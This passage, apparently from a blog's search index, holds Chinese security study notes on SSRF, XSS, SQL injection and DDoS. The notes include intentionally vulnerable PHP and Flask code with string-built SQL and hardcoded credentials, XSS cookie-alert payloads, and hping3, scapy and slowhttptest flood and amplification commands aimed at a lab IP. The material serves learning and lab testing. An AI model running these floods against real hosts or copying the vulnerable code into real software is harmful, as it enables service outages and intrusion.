\n&quot;; &#125; else &#123; $out = &quot;GET $link HTTP/1.1\r\n&quot;; $out .= &quot;Host: $host\r\n&quot;; $out .= &quot;Connection: Close\r\n\r\n&quot;; $out .= &quot;\r\n&quot;; fwrite($fp, $out); $contents=&apos;&apos;; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt; 这段代码使用 fsockopen 函数实现获取用户制定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。 3、curl_exec() 123456789101112131415&lt;?php if (isset($_POST[&apos;url&apos;])) &#123; $link = $_POST[&apos;url&apos;]; $curlobj = curl_init(); curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($curlobj); curl_close($curlobj); $filename = &apos;./curled/&apos;.rand().&apos;.txt&apos;; file_put_contents($filename, $result); echo $result;&#125;?&gt; 使用 curl 获取数据。 SSRF利用 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息 攻击运行在内网或本地的应用程序（比如溢出） 对内网 WEB 应用进行指纹识别，通过访问默认文件实现 攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli，redis等） 利用 file 协议读取本地文件等 其中file,dict,gopher协议常用。 1. 利用 file 协议读取本地文件此处应有实验 2. 利用dict协议探测端口此处应有实验 3. 利用gopher协议Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面 此处应有实验 稍复杂一点的情况利用gopher攻击内网中的一些有漏洞的应用等，如长亭文章中所说，利用gopher协议攻击redis应用。主要攻击 redis、discuz、fastcgi、memcache、内网脆弱应用这几类应用 防御手段 限制协议为 HTTP、HTTPS，需求不需要，就不要开类似gopher，file，ftp协议 禁止 30x 跳转 设置 URL 白名单或者限制内网 IP 服务端需要鉴权（Cookies &amp; User：Pass）不能完美利用 参考链接：http://v0w.top/2018/11/23/SSRF-notes/]]></content>
  </entry>
  <entry>
    <title><![CDATA[XSS相关]]></title>
    <url>%2F2019%2F12%2F16%2FXSS%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[什么是XSS?Cross Site Scripting，跨站脚本攻击,为了和层叠样式表（Cascading Style Sheet，CSS）区分，在WEB安全叫XSS。 简述：XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 成因通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执行用户注入的脚本。 危害攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致 XSS 。 网络钓鱼，包括获取各类用户账号； 窃取用户 cookies 资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作； 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等； 强制弹出广告页面、刷流量等； 网页挂马； 进行恶意操作，如任意篡改页面信息、删除文章等； 进行大量的客户端攻击，如ddos等； 获取客户端信息，如用户的浏览历史、真实ip、开放端口等； 控制受害者机器向其他网站发起攻击； 结合其他漏洞，如csrf,实施进一步危害； 提升用户权限，包括进一步渗透网站； 传播跨站脚本蠕虫等 易产生XSS的地方 数据交互的地方 get、post、cookies、headers 反馈与浏览 富文本编辑器 各类标签插入和自定义 数据输出的地方 用户资料 关键词、标签、说明 文件上传 分类1、反射型Reflected XSS Attacks 反射型 XSS 攻击，有些地方也称为非持续性 XSS ，这种攻击方式往往具有一次性，只在用户单击时触发。因为 payload 在触发时，是客户端渲染了服务器响应体，payload 经过了服务器，是与服务器产生了交互了的。 常见注入点网站的搜索栏、用户登录入口、输入表单等地方。 攻击方式反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 alert(document.cookie) 漏洞复现构造反射型web界面 12345678910111213141516&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;XSS原理重现&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;hr&gt; &lt;?php $xss = @$_GET[&apos;xss_input&apos;]; echo &quot;your input:&quot;.$xss.&quot;\n&quot;; ?&gt;&lt;/body&gt;&lt;/html&gt; POC:alert(document.cookie) 看一下源码，发现XSS语句已经嵌入到html中。 2、存储型Stored XSS Attacks 持久型XSS，比反射型XSS更具有威胁性，并且可能影响到Web服务器自身的安全。攻击脚本将被永久的存放在目标服务器的数据库或文件中。 常见注入点论坛、博客、留言板、网站的留言、评论、日志等交互处。 攻击方式攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。 漏洞复现构造存储型XSS WEB界面 向后台数据库中存入POC save_xss.php 123456789101112131415161718192021222324252627&lt;html&gt;&lt;!--此网页用于向数据库中存入poc--&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;存储型XSS重现&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;id&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;xss_input&quot; value=&quot;text&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt; &lt;hr&gt;&lt;!--分割线--&gt; &lt;?php $id = @$_GET[&apos;id&apos;]; $xss = @$_GET[&apos;xss_input&apos;]; mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;); mysql_select_db(&quot;users&quot;); if($xss !== null)&#123; $sql = &quot;insert into xss(id,text)values(&apos;$id&apos;,&apos;$xss&apos;)&quot;; $result = mysql_query($sql); echo $result; &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; save_xss2.php 显示数据中的内容 12345678910111213141516171819&lt;html&gt;&lt;!--此网页用于展示数据库中的所有数据--&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;存储型XSS重现2&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;); mysql_select_db(&quot;users&quot;); $sql = &quot;select id,text from xss&quot;; $result = mysql_query($sql); while(@$row=mysql_fetch_array($result))&#123; echo $row[&apos;id&apos;].&quot;:&quot;.$row[&apos;text&apos;].&quot;&lt;/br&gt;&quot;; &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; 前端访问： 插入前端html 中 3、DOM型DOM(Document object model)，使用 DOM 能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。 DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象的一种漏洞。DOM型XSS是基于js上的。不需要与服务器进行交互。 注入点通过js脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器d端交互，它只发生在客户端处理数据的阶段。 攻击方式用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞 漏洞复现xss_dom.php 1234567891011121314151617&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;DOM型XSS重现&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt;&lt;!--js脚本--&gt; function test()&#123; var str = document.getElementById(&quot;text&quot;).value; document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos;&gt;testLink&lt;/a&gt;&quot;; &#125; &lt;/script&gt; &lt;div id=&quot;t&quot;&gt;&lt;/div&gt; &lt;input type=&quot;text&quot; id=&quot;text&quot; =&quot;text&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;url&quot; onclick=&quot;test()&quot; /&gt;&lt;/body&gt;&lt;/html&gt; POC:1&apos;&gt;&lt;img src=# onerror=&quot;alert(document.cookie)&quot;&gt;&lt;&apos; 1&apos; onclick=alert(document.cookie) // 闭合href标签，注释后面多余内容，从而在用户点击超链接时，触发XSS。 测试总结 XSS类型 反射型 存储型 DOM型 触发过程 正常用户访问携带XSS的url 1.黑客构造XSS脚本 2.用户访问有XSS脚本的网站 正常用户访问携带XSS的url 存储位置 url 数据库 url 谁来输出 后端web 后端web 前端JS 输出位置 HTML响应 HTML响应 动态生成的DOM节点 黑盒测试尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些： URL的每一个参数URL本身表单搜索框 常见业务场景重灾区：评论区、留言区、个人信息、订单信息等针对型：站内信、网页即时通讯、私信、意见反馈存在风险：搜索框、当前目录、图片属性等 XSS防御XSS的根本就是向网站插入脚本代码，并使它运行的一种手段。防御方法分为两种，服务端防御和客户端防御。 服务端防御：1、HttpOnly可以限制javascript不能读取cookie，防止会话ID泄露2、处理富文本过滤掉富文本中的敏感标签如（script、iframe、form），还有敏感词（javascript:） 等等 客户端防御：1、输入检查防止输入敏感字段，如javascript、cookie等等2、检查输出脚本都是通过混淆在HTML当中，被当成html代码的一部分才得到执行。可以通过编码转义的办法，使得混淆在其中的脚本被当成文本处理，不会被执行。编码转义的话，有三种方法： 1. HTML encode 将字符转换成HTMLEntities，一般会转（&amp;、&lt;、&gt;、”、’、/）这6个字符。一般是在html标签属性输出的时候使用2. JavaScriptEncode 使用”\“对特殊字符进行转义。 一般在script标签输出、事件输出、CSS输出3. URL Encode 使用URLEncode的方法。 参考链接：http://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/ https://xz.aliyun.com/t/4067]]></content>
  </entry>
  <entry>
    <title><![CDATA[手工注入过程]]></title>
    <url>%2F2019%2F11%2F21%2F%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[1、手工测试之前搭建的不同注入环境，并记录 sql 语句，最终以获取 mysql 中的用户信息和当前表的信息为目标 2、思考通过注入漏洞可以做什么？ 3、思考注入漏洞如何防御？代码、服务器等角度 扩展学习：针对不同的注入漏洞，编写防御代码，具体如何防御自己决定，相关代码均记录在报告中，测试自己的防御代码是否可以绕过，并将过程进行记录 1 常规回显手工注入]]></content>
  </entry>
  <entry>
    <title><![CDATA[关于ddos]]></title>
    <url>%2F2019%2F10%2F04%2F%E5%85%B3%E4%BA%8Eddos%2F</url>
    <content type="text"><![CDATA[DDOS分类？资源消耗类型连接类主要表现为常用的连接耗尽，包括并发连接，新建连接，慢速连接，空连接等； 数据库查询主要表现为账号验证，表项查询，数据提交等； 网络：带宽 防火墙：吞吐量，并发连接 服务器：CPU.内存，I/O 应用：处理请求能力，对操作系统的使用权 带宽上限，设备性能上限，协议性能上限，应用性能上限，系统性能上限 利用漏洞崩溃系统 崩溃程序 网络流量型：利用网络通讯协议 SYN Flood ACK Flood ICMP Flood UDP Flood DNS Flood HTTP Flood 应用层 Http Flood DNS Flood Https Flood等 协议层 SYN Flood、ICMP Flood Tcp Flood、Udp Flood等 网络层 Arp攻击 hping详细参数解析： -h –help 显示帮助信息 -v –version 显示Hping的版本信息 -c –count 指定数据包的次数 -i –interval 指定发包间隔为多少毫秒，如-i m10：表示发包间隔为毫秒 –flood 尽最快发送数据包，不显示回复 指定所用的模式： 默认模式 TCP模式 -0 –rawip RAW IP 模式 -1 –icmp ICMP 模式 -2 –udp UDP 模式 -8 –scan 扫描模式. 例: hping –scan 1-30,70-90 -S www.target.host -9 –listen 监听模式 IP选项： -a –spoof 源地址欺骗 –rand-dest 随机目的地址模式 –rand-source 随机源地址模式 -t –ttl ttl值，默认为64 -N –id 指定id，默认是随机的 -W –winid 使用win*的id 字节顺序 -r –rel 相对的id区域 -f –frag 将数据包分片后传输（可以通过薄弱的acl（访问控制 列表）） -x –morefrag 设置更多的分片标记 -y –dontfrag 设置不加分片标记 -g –fragoff 设置分片偏移 -m –mtu 设置虚拟MTU, 当数据包&gt;MTU时要使用–frag 进行分片 -o –tos 指定服务类型，默认是0x00,，可以使用–tos help查看帮助 -G –rroute 包含RECORD_ROUTE选项并且显示路由缓存 –lsrr 释放源路记录 –ssrr 严格的源路由记录 -H –ipproto 设置协议范围，仅在RAW IP模式下使用 ICMP选项 -C –icmptype 指定icmp类型（默认类型为回显请求） -K –icmpcode 指定icmp编码（默认为0） –force-icmp 发送所有ICMP数据包类型（默认只发送可以支持的类型） –icmp-gw 针对ICMP数据包重定向设定网关地址（默认是0.0.0.0） –icmp-ts 相当于–icmp –icmptype 13（ICMP时间戳） –icmp-addr 相当于–icmp –icmptype 17（ICMP地址掩码） –icmp-help 显示ICMP的其它帮助选项 UDP/TCP选项 -s –baseport 基本源端口（默认是随机的） -p –destport 目的端口（默认为0），可同时指定多个端口 -k –keep 仍然保持源端口 -w –win 指定数据包大小，默认为64 -O –tcpoff 设置假的TCP数据偏移 -Q –seqnum 仅显示TCP序列号 -b –badcksum 尝试发送不正确IP校验和的数据包 许多系统在发送数据包时使用固定的IP校验和，因此你会得到不正确的UDP/TCP校验和. -M –setseq 设置TCP序列号 -L –setack 使用TCP的ACK（访问控制列表） -F –fin 使用FIN标记set FIN flag -S –syn 使用SNY标记 -R –rst 使用RST标记 -P –push 使用PUSH标记 -A –ack 使用 ACK 标记 -U –urg 使用URG标记 -X –xmas 使用 X 未用标记 (0x40) -Y –ymas 使用 Y 未用标记 (0x80) –tcpexitcode 最后使用 tcp-&gt;th_flags 作为退出代码 –tcp-timestamp 启动TCP时间戳选项来猜测运行时间 常规选项 -d –data 数据大小，默认为0 -E –file 从指定文件中读取数据 -e –sign 增加签名 -j –dump 以十六进行形式转存数据包 -J –print 转存可输出的字符 -B –safe 启用安全协议 -u –end 当通过- -file指定的文件结束时停止并显示，防止文件再从头开始 -T –traceroute 路由跟踪模式 –tr-stop 在路由跟踪模式下当收到第一个非ICMP数据包时退出 –tr-keep-ttl 保持源TTL，对监测一个hop有用 –tr-no-rtt 使用路由跟踪模式时不计算或显示RTT信息 ARS 数据包描述（新增加的内容，暂时还不稳定） –apd-send 发送用描述APD的数据包 TCP的正常连接建立和关闭 TCP报文段格式 TCP三次握手三次握手(Three-way Handshake)，是指建立一个TCP连接时，需要客户端和服务器总共发送3个包。 三次握手的目的是连接服务器指定端口，建立TCP连接,并同步连接双方的序列号和确认号并交换 TCP 窗口大小信息.在socket编程中，客户端执行connect()时。将触发三次握手。 第一次握手: 客户端发送一个TCP的SYN标志位置1的包指明客户打算连接的服务器的端口，以及初始序号X,保存在包头的序列号(Sequence Number)字段里 第二次握手: 服务器发回确认包(ACK)应答。即SYN标志位和ACK标志位均为1同时，将确认序号(Acknowledgement Number)设置为客户的ISN(初始序列号)加1以.即X+1。 第三次握手.客户端再次发送确认包(ACK) SYN标志位为0,ACK标志位为1.并且把服务器发来ACK的序号字段+1,放在确定字段中发送给对方.并且在数据段放写ISN的+1 TCP四次挥手 DDoS测试SYN Flood原理：攻击者通过发送大量伪造的带有SYN标志位的TCP报文，与目标主机建立了很多虚假的半开连接，在服务器返回SYN+ACK数据包后，攻击者不对其做出响应，也就是不返回ACK数据包给服务器，这样服务器就会一直等待直到超时。 在三次握手过程中，服务器发送SYN-ACK之后，收到客户端的ACK之前的TCP连接称为半连接(half-open connect).此时服务器处于Syn_RECV状态.当收到ACK后，服务器转入ESTABLISHED状态. 现象：使目标服务器连接资源耗尽、链路堵塞，从而达到拒绝服务的目的。 由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。 测试命令：hping3 -c 1000 -d 120 -S -p 80 –flood –rand-source 192.168.1.116 -c –count 指定数据包的次数 -d –data 数据大小，默认为0 -S –syn 使用SNY标记 -p –destport 目的端口（默认为0），可同时指定多个端口 统计分析： windows：netstat –an | find “SYN_RECEIVED” linux：netstat -n | awk ‘/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}’ Win7如何开启/关闭TCP/IP半开连接数限制 ACK Flood原理：第一种：攻击者伪造大量的SYN+ACK包发送给目标主机，目标主机每收到一个SYN+ACK数据包时，都会去自己的TCP连接表中查看有没有与ACK的发送者建立连接，如果有则发送ACK包完成TCP连接，如果没有则发送ACK+RST 断开连接。但是在查询过程中会消耗一定的CUP计算资源。 第二种： 利用TCP三次握手的ACK+SYN应答，攻击者向不同的服务器发送大量的SYN请求，这些SYN请求数据包的源IP均为受害主机IP 现象：针对第一种方式：如果瞬间收到大量的SYN+ACK数据包，将会消耗服务器的大量cpu资源，导致正常的连接无法建立或增加延迟，甚至造成服务器瘫痪、死机。 针对第二种方式：会有大量的SYN+ACK应答数据包发往受害主机，从而占用目标的网络带宽资源，形成拒绝服务。 测试命令：hping3 –ack -S –flood 192.168.1.116 -s 6666 固定源端口 默认是随机的 ICMP Flood原理：ICMP Flood 的攻击原理和ACK Flood原理类似，属于流量型的攻击方式，由于目前很多防火墙直接过滤ICMP报文， 因此ICMP Flood出现的频度较低。 现象：给服务器带来较大的负载，影响服务器的正常。 测试命令：hping3 -d 200 –icmp –flood -a 1.1.1.1 192.168.1.116 -d –data 数据大小，默认为0 -a 指定源IP UDP Flood原理：UDP（User Datagram Protocol，用户数据报协议），是一种无连接和无状态的网络协议，UDP不需要像TCP那样进行三次握手，运行开销低，不需要确认数据包是否成功到达目的地。这就造成UDP泛洪攻击不但效率高，而且还可以在资源相对较少的情况下执行。UDP大量小数据包会增大网络设备处理数据包的压力；FLOOD可以使用小数据包(64字节)进行攻击,也可以使用大数据包(大于1500字节,以太网MTU为1500字节)进行攻击。 现象：对于大数据包，网络设备需要进行分片、重组，最终达到的效果就是占用网络传输接口的带宽、网络堵塞、服务器响应慢等等。 测试命令：hping3 –udp -p 53 –flood 192.168.1.116 DNS Flood 反射攻击原理： 利用协议特性实现放大效果的流量，查询流量小，相应流量非常巨大 攻击者向僵尸网络发出指令，使僵尸网络中的每一台主机均发出一个伪造源地址的DNS查询请求包，这些请求包查询类型设置为ANY，因为这种类型会请求所有的记录，这些记录会在返回的响应包中，也就是说这种数据包的大小较其他类型是最大的。 伪造DNS数据包，向DNS服务器发送域名查询报文了，而DNS服务器返回的应答报文则会发送给被攻击主机。放大体现在请求DNS回复的类型为ANY，攻击者向服务器请求的包长度为69个字节，而服务器向被攻击主机回复的ANY类型DNS包长度为535字节，大约放大了7倍。 DNS 报文格式 测试命令：scapy i = IP (src=”192.168.1.107”,dst=”114.114.114.114”) u = UDP() q = DNSQR(qname=”nsfocus.com”,qtype=255) d =DNS (rd =1, qdcount=1,qd=q) r = (i/u/d) send(r,loop=1) q = DNSQR(qname=”nsfocus.com”,qtype=255) # 255 类型是any d =DNS (rd =1, qdcount=1,qd=q) #rd=1表示执行递归查询 如果迭代查询第一个请求的DNS服务器没有查询到结果，那么第一个请求的服务器会返回另一个DNS服务器IP，让请求主机向这个IP去继续查询，然而攻击者的数据包源地址是伪造的，所以并不会发起第二次查询，因为第一次查询根本就不是它发起的；而递归查询却是在查询到结果之后，才返回给查询请求发起者。 r = (i/u/d) #合并数据包 CC攻击原理：又称作HTTP 泛洪攻击，其原理是攻击者控制肉鸡、僵尸网络或使用代理服务器，不停地向目标的web服务发送大量合法请求 现象：使得正常用户的web请求处理缓慢甚至得不到处理，制造大量的后台数据库查询动作，消耗目标CPU资源，最终导致服务器宕机崩溃。 测试命令： HTTP慢速攻击原理：模拟正常用户向web服务器发送慢速http请求，由于是慢速的，服务器端需要保持连接资源，直到数据传输结束或请求结束才可释放连接。这种攻击可以分为两类：一类是客户端发数据，另一类是客户端读取服务器发来的数据。HTTP慢速攻击对基于线程处理的web服务器影响显著，如apache、dhttpd，而对基于事件处理的web服务器影响不大，如ngix、lighttpd。 现象：当服务器端建立了大量这样的慢速连接，就会导致服务器拒绝服务。 Slowloris攻击方式HTTP协议规定请求头以一个空行结束，所以完整的http请求头结尾是\r\n\r\n。然而使用非正常的\r\n来结尾，就会导致服务端认为我们的请求头还没结束，等待我们继续发送数据直到超时时间。两种请求头区别如下，CRLF（CarriageReturn Line Feed）表示回车换行 Slow post攻击方式在http头部信息，可以使用content-length声明HTTP消息实体的传输长度，服务器端会content-length的值作为HTTPBODY的长度。利用这一特点，攻击者把content-length设置得很大的，然后缓慢发送数据部分，比如一次只发送一个字节，这样服务器端就要一直保持连接，直到客户端传完所有的数据。 Slow read攻击方式攻击者发送一个完整的HTTP数据请求，之后服务器会给出响应，这时攻击者在将自己的TCP窗口大小设置的很小，服务器会根据客户的TCP窗口大小来传送数据。由于客户端的TCP窗口大小很小，服务器只能缓慢的传输数据给客户端。当建立大量的这种连接时，web应用的并发连接池将被耗尽，最终导致拒绝服务。 Apache range header攻击这种攻击方式只针对apache，当客户端传输大文件时会有range字段，表示将大文件分段，分成几个小段进行传输。例如攻击者将一个文件按照一个字节一段，分成好多段，这样就会造成传输数据缓慢，长时间占用连接，消耗服务器CPU和内存资源。 测试命令：安装slowhttptest Slowloris攻击命令：slowhttptest -c 50 -H -g -o my_header_stats -i 10 -r 200 -t GET -u slowhttptest -c 50 -H -g -o my_header_stats -i 10 -r 200 -t GET -u http://192.168.1.116/dvwa/login.php -c number of connections 测试时建立的连接数-H SlowLoris模式-g 在测试完成后，以时间戳为名生成一个CVS和HTML文件的统计数据-o file name 使用-g参数时，可以使用此参数指定输出文件名-i seconds 在slowrois和Slow POST模式中，指定发送数据间的间隔。-r connections per second 每秒连接个数-t HTTP verb 在请求时使用什么操作，默认GET netstat -pantu | grep ESTABLISHED 正常 异常，0d表示\r,0a表示\n，也就是说结尾是\r\n。 Slow post攻击命令slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8888 -t FAKEVERB -u http://192.168.1.116/dvwa/login.php -x 10 -p 3 -s 设置的数据长度 Slow read攻击命令slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://192.168.1.116/dvwa/login.php -x 24 -p 3 Apache range header攻击命令slowhttptest -R -u http://192.168.1.116/dvwa/login.php -t HEAD -c 1000 -a 10 -b 3000 -r 500 参考资料：https://www.cnblogs.com/zmlctt/p/3690998.html https://xz.aliyun.com/t/71#toc-11 https://blog.csdn.net/Fly_hps/article/details/80941148]]></content>
  </entry>
  <entry>
    <title><![CDATA[各种注入类型的环境搭建和代码编写]]></title>
    <url>%2F2019%2F10%2F03%2F%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99%2F</url>
    <content type="text"><![CDATA[目标：通过flask实现用户注册 用户登录 用户查询目录结构python_web —templates # 模板 —registe.html —login.html —base.html —result.html —main.py 需要用到的第三方库 pymysqflaskrender_templaterequestBootstrap 思路1、导入第三方库 启动一个简单的flask应用2、定义路由 ‘/regist’ 注册页面，’/‘登录页面，’/serch’搜索页面3、pymysql 连接数据库 main.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from flask import request,Flask,render_templateimport pymysqlfrom flask_bootstrap import Bootstrapapp = Flask(__name__)bootstrap = Bootstrap(app)@app.route(&apos;/regist&apos;)def regist(): return render_template(&apos;regist.html&apos;)@app.route(&apos;/&apos;)def login(): return render_template(&apos;login.html&apos;)@app.route(&apos;/registuser&apos;)def registuser(): db = pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor = db.cursor() username = request.args.get(&apos;user&apos;) userpass = request.args.get(&apos;password&apos;) sql= &quot;INSERT INTO USER(user,password) VALUE (&apos;%s&apos;,&apos;%s&apos;)&quot; % (username,userpass) try: cursor.execute(sql) db.commit() return render_template(&apos;login.html&apos;) except: db.rollback() return &apos;对不起，您的注册失败 &apos; db.close()@app.route(&apos;/login&apos;)def checkuser(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) userpass = request.args.get(&apos;password&apos;) sql= &quot;SELECT * FROM USER WHERE user=&apos;%s&apos; AND password = %s&quot; % (username,userpass) cursor.execute(sql) db.commit() result=cursor.fetchall() if (result!=()): return &apos;登录成功&apos; return &apos;登录失败&apos;# @app.route(&apos;/getuser&apos;)# def getuer():# return render_template(&apos;getuer.html&apos;)@app.route(&apos;/search&apos;,methods=[&quot;get&quot;,&quot;post&quot;])def search(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) sql= &quot;SELECT * FROM USER WHERE user = &apos;%s&apos;&quot; % username try: cursor.execute(sql) except Exception as err: return (&quot;Error %s for excute sql: %s &quot; % (err, &quot;SELECT * FROM USER WHERE USER = &apos;%s&apos;&quot; % pymysql.escape_string(username))) db.commit() result=cursor.fetchall() db.commit() db.close() return render_template(&apos;result.html&apos;,u=result)if __name__ == &apos;__main__&apos;: app.run(host=&apos;0.0.0.0&apos;,port=&apos;8898&apos;) 问题Q: 如何使用变量向sql语句中传递参数 A： username= zsc userpass = 0810 sql= “INSERT INTO USER(user,password) VALUE (‘%s’,’%s’)” % (username,userpass) 使用该方法可以向数据库中插入字符串，否则只允许插入整形 result = cursor.fetchone() # 返回单个的元组，也就是一条记录(row)，如果没有结果 则返回 Noneresult = cursor.fetchall() # 返回多个元组，即返回多个记录(rows),如果没有结果 则返回 () base.html1234567891011121314151617181920&#123;% extends &quot;bootstrap/base.html&quot; %&#125;&#123;% block title %&#125;Flask&#123;% endblock %&#125;&#123;% block navbar %&#125;&lt;div class=&quot;navbar navbar-inverse&quot; role=&quot;navigation&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;navbar-toggle&quot; data-toggle=&quot;collapse&quot; data-target=&quot;.navbar-collapse&quot;&gt; &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;注册用户查询系统&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;navbar-collapse collapse&quot;&gt; &lt;ul class=&quot;nav navbar-nav&quot;&gt; &lt;li&gt;&lt;a href=&quot;/&quot;&gt;首页&lt;/a&gt;&lt;/li&gt;​ &lt;/ul&gt; &lt;/div&gt; ​12345678910111213141516171819202122232425&lt;/div&gt;&lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/search&apos;&gt; &lt;label&gt;请输入您要搜索的用户名：&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;&quot;&gt;&lt;/label&gt; &lt;input type=&quot;submit&quot; value=&quot;搜索&quot;&gt; &lt;/form&gt; &lt;/body&gt;&#123;% endblock %&#125;&#123;% block content %&#125;&lt;div class=&quot;container&quot;&gt; &#123;% block page_content %&#125;&#123;% endblock %&#125;&lt;/div&gt;&#123;% endblock %&#125;&lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/getuser&apos;&gt; &lt;label&gt;请输入您要搜索的用户名：&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;&quot;&gt;&lt;/label&gt; &lt;input type=&quot;submit&quot; value=&quot;搜索&quot;&gt; &lt;/form&gt;​ &lt;/body&gt; regist.html123456789101112131415&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/registuser&apos;&gt; 